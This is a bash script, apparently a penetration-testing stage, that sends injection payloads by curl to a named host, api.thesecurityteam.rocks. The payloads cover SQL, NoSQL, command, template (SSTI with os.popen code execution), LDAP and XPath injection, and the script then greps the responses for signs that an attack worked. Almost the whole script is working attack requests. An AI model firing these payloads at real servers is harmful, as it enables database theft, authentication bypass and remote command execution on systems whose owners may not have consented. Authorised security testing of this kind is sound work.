#!/bin/bash
echo "======================================"
echo "TESTING SERVER-SIDE INJECTION - api.thesecurityteam.rocks"
echo "======================================"
echo

TARGET="api.thesecurityteam.rocks"
PROTOCOL="https"
FULL_URL="https://api.thesecurityteam.rocks"

echo "[INFO] Starting Server-Side Injection testing..."
echo "[TARGET] $FULL_URL"
echo "[TIME] $(date)"
echo

# SQL Injection Tests
echo "[SQL INJECTION] Testing SQL injection vulnerabilities..."

# Test 1: Basic SQL injection in GET parameters
echo "[SQL-1] Basic SQL injection in GET parameters..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?id=1' OR '1'='1" --connect-timeout 10 --max-time 30 > sql_injection_test1.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/?user=admin'--" --connect-timeout 10 --max-time 30 >> sql_injection_test1.txt
echo "[RESULT] Check sql_injection_test1.txt"

# Test 2: UNION-based SQL injection
echo "[SQL-2] UNION-based SQL injection..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?id=1 UNION SELECT 1,2,3,4,5" --connect-timeout 10 --max-time 30 > sql_injection_test2.txt
curl -s -k -X POST "$PROTOCOL://$TARGET/api/login" -H "Content-Type: application/json" -d '{"username":"1 UNION SELECT null,null,null,null,null"}' --connect-timeout 10 --max-time 30 >> sql_injection_test2.txt
echo "[RESULT] Check sql_injection_test2.txt"

# Test 3: Time-based blind SQL injection
echo "[SQL-3] Time-based blind SQL injection..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?id=1; WAITFOR DELAY '0:0:5'" --connect-timeout 15 --max-time 20 > sql_injection_test3.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/?q=1' AND SLEEP(5)--" --connect-timeout 15 --max-time 20 >> sql_injection_test3.txt
echo "[RESULT] Check sql_injection_test3.txt"

# Test 4: NoSQL injection (MongoDB-style)
echo "[SQL-4] NoSQL injection testing..."
curl -s -k -X POST "$PROTOCOL://$TARGET/api/users" -H "Content-Type: application/json" -d '{"username":{"$ne":null},"password":{"$ne":null}}' --connect-timeout 10 --max-time 30 > nosql_injection_test.txt
curl -s -k -X POST "$PROTOCOL://$TARGET/api/search" -H "Content-Type: application/json" -d '{"$where":"this.username==this.password"}' --connect-timeout 10 --max-time 30 >> nosql_injection_test.txt
echo "[RESULT] Check nosql_injection_test.txt"

# Command Injection Tests
echo "[COMMAND INJECTION] Testing command injection vulnerabilities..."

# Test 5: Basic command injection
echo "[CMD-1] Basic command injection..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?cmd=; whoami" --connect-timeout 10 --max-time 30 > command_injection_test1.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/?file=| id" --connect-timeout 10 --max-time 30 >> command_injection_test1.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/?search=&& uname -a" --connect-timeout 10 --max-time 30 >> command_injection_test1.txt
echo "[RESULT] Check command_injection_test1.txt"

# Test 6: Advanced command injection
echo "[CMD-2] Advanced command injection..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?cmd=$(whoami)" --connect-timeout 10 --max-time 30 > command_injection_test2.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/?param=`id`" --connect-timeout 10 --max-time 30 >> command_injection_test2.txt
curl -s -k -X POST "$PROTOCOL://$TARGET/api/process" -d "command=ls -la" --connect-timeout 10 --max-time 30 >> command_injection_test2.txt
echo "[RESULT] Check command_injection_test2.txt"

# Template Injection Tests
echo "[TEMPLATE INJECTION] Testing template injection vulnerabilities..."

# Test 7: Template injection (Jinja2/Smarty style)
echo "[TPL-1] Template injection testing..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?name={{7*7}}" --connect-timeout 10 --max-time 30 > template_injection_test1.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/?search=\${7*7}" --connect-timeout 10 --max-time 30 >> template_injection_test1.txt
curl -s -k -X POST "$PROTOCOL://$TARGET/api/template" -d "template={% for item in [1,2,3] %}{{item}}{% endfor %}" --connect-timeout 10 --max-time 30 >> template_injection_test1.txt
echo "[RESULT] Check template_injection_test1.txt"

# Test 8: SSTI with code execution attempts
echo "[TPL-2] SSTI code execution attempts..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?input={{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}" --connect-timeout 10 --max-time 30 > template_injection_test2.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/?data={{().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].exit()}}" --connect-timeout 10 --max-time 30 >> template_injection_test2.txt
echo "[RESULT] Check template_injection_test2.txt"

# LDAP Injection Tests
echo "[LDAP INJECTION] Testing LDAP injection vulnerabilities..."

# Test 9: LDAP injection
echo "[LDAP-1] LDAP injection testing..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?user=*)(uid=*" --connect-timeout 10 --max-time 30 > ldap_injection_test.txt
curl -s -k -X POST "$PROTOCOL://$TARGET/api/auth" -d "username=admin)(objectClass=*)" --connect-timeout 10 --max-time 30 >> ldap_injection_test.txt
echo "[RESULT] Check ldap_injection_test.txt"

# Test 10: XPath injection
echo "[XPATH-1] XPath injection testing..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?xml=<user>admin' or '1'='1</user>" --connect-timeout 10 --max-time 30 > xpath_injection_test.txt
curl -s -k -X POST "$PROTOCOL://$TARGET/api/search" -d "query=//user[username/text()='admin' or '1'='1']" --connect-timeout 10 --max-time 30 >> xpath_injection_test.txt
echo "[RESULT] Check xpath_injection_test.txt"

echo "[COMPLETED] Server-Side Injection testing completed. Review all injection_test*.txt files."
echo "[TIME] $(date)"
echo

# Analysis
echo "[ANALYSIS] Searching for injection indicators..."
grep -i "mysql\|postgresql\|oracle\|syntax error\|mysql_fetch\|pg_sleep\|whoami\|id\|uname\|\{\{.*\}\}" *.txt > injection_indicators.txt 2>/dev/null
if [ -s injection_indicators.txt ]; then
    echo "[WARNING] Potential injection vulnerabilities found! Check injection_indicators.txt"
else
    echo "[INFO] No obvious injection indicators in initial analysis"
fi
echo

echo "Server-Side Injection testing phase completed successfully."
read -p "Press Enter to continue..."